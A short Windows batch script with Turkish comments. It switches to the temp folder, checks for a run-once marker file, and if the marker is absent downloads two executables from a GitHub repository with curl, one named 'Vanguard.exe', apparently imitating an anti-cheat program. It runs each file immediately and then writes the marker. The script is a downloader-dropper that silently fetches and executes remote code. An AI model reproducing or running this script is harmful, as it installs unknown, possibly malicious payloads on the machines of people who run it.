@echo off
cd %temp%

REM Dosya kontrolü
if exist nagihori2.txt (
    echo nagihori.txt bulundu, çıkılıyor...
    exit /b
) else (
    echo nagihori.txt yok, devam ediliyor...
    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/Vanguard.exe -o local4.exe
    local4.exe
    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
    local3.exe
    echo "asd" > nagihori2.txt 
    
)
